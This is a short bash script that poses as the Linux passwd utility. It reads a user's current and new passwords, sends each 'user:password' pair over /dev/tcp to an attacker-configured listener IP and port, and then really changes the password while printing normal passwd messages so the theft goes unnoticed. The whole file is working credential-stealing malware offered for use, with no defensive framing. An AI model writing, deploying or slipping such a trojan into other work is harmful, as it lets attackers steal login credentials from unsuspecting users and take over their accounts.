#!/bin/bash

listener_ip=192.168.1.233 # UPDATE THIS
listener_port=4444        # UPDATE THIS

oldpass="NOTSUPPLIED"

# test if param1 set or assume currentuser is target
# TODO: check if param1 is a real user
if [ -n "$1" ]
then
  user=$1
else
  user=$(whoami)
fi

if [ "$(whoami)" != "root" ]
then
  # prompt for password
  # TODO: check if password is correct
  echo "Changing password for $user."
  read -p "Current password: " -s oldpass; echo ""
fi

# echo old password back to listener
echo "$user:$oldpass" 2>/dev/null > /dev/tcp/$listener_ip/$listener_port

read -p "New password: " -s newpass; echo ""
read -p "Retype new password: " -s newpass2; echo ""

# echo new password back to listener
echo "$user:$newpass" 2>/dev/null > /dev/tcp/$listener_ip/$listener_port

# test if new passwords match
if [ "$newpass" == "$newpass2" ]
then
  # match. change user's password
  echo "$user:$newpass" > tempfile 2>/dev/null #janky but whatever
  chpasswd < tempfile 2>/dev/null
  rm tempfile 2>/dev/null
  echo "passwd: password updated successfully"
else
  # mismatch. throw error
  echo "Sorry, passwords do not match."; echo "passwd: Authentication token manipulation error"; echo "passwd: password unchanged"
fi
